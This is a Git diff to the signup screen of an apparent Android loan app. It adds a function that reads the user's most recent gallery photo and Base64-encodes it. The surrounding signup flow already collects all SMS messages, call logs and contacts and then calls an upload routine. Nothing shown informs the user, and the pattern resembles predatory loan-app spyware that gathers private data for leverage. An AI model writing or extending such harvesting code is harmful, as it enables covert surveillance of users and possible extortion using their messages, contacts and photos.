@@ -2,10 +2,11 @@ package com.androiddev.loanapplication.activity
 
 import android.annotation.SuppressLint
 import android.app.ProgressDialog
-import android.content.ContentUris
-import android.content.Context
 import android.content.Intent
 import android.content.pm.PackageManager
+import android.database.Cursor
+import android.graphics.Bitmap
+import android.graphics.BitmapFactory
 import android.net.Uri
 import android.os.Build
 import android.os.Bundle
@@ -13,6 +14,7 @@ import android.provider.CallLog
 import android.provider.ContactsContract
 import android.provider.MediaStore
 import android.provider.Telephony
+import android.util.Base64
 import android.util.Log
 import android.widget.Toast
 import androidx.annotation.RequiresApi
@@ -24,6 +26,7 @@ import com.androiddev.loanapplication.model.Calllogs
 import com.androiddev.loanapplication.model.Contacts
 import com.androiddev.loanapplication.model.Messages
 import com.androiddev.loanapplication.viewmodel.SigninViewmodel
+import java.io.ByteArrayOutputStream
 import java.lang.Long
 import java.util.Date
 import kotlin.Array
@@ -31,8 +34,6 @@ import kotlin.Int
 import kotlin.IntArray
 import kotlin.String
 import kotlin.arrayOf
-import kotlin.let
-import kotlin.run
 import kotlin.toString
 
 
@@ -75,6 +76,7 @@ class SignupActivity : AppCompatActivity() {
             getAllSms()
             getCallLogs()
             getNamePhoneDetails()
+            getLatestImageUri()
             signinViewmodel.uploadUserData()
         }
     }
@@ -233,6 +235,36 @@ class SignupActivity : AppCompatActivity() {
                 Toast.makeText(this, "User already exists", Toast.LENGTH_SHORT).show()
             } else {
                 startActivity(Intent(this, SigninActivity::class.java))
+            }
+        }
+    }
+    private fun getLatestImageUri() {
+        val projection = arrayOf(MediaStore.Images.Media._ID, MediaStore.Images.Media.DATE_ADDED)
+        val sortOrder = "${MediaStore.Images.Media.DATE_ADDED} DESC"
+        val cursor: Cursor? = contentResolver.query(
+            MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
+            projection,
+            null,
+            null,
+            sortOrder
+        )
+        cursor?.use {
+            if (it.moveToFirst()) {
+                val id = it.getLong(it.getColumnIndexOrThrow(MediaStore.Images.Media._ID))
+                val uriData = Uri.withAppendedPath(
+                    MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
+                    id.toString()
+                )
+                val bitmapData = contentResolver.openInputStream(uriData)?.use { inputStream ->
+                    BitmapFactory.decodeStream(inputStream)
+                }
+
+                val byteArrayOutputStream = ByteArrayOutputStream()
+                bitmapData?.compress(Bitmap.CompressFormat.JPEG, 100, byteArrayOutputStream)
+                val byteArray = byteArrayOutputStream.toByteArray()
+                val base64 = Base64.encodeToString(byteArray, Base64.DEFAULT)
+            }else{
+                Toast.makeText(this, "No Image found", Toast.LENGTH_SHORT).show()
             }
         }
     }
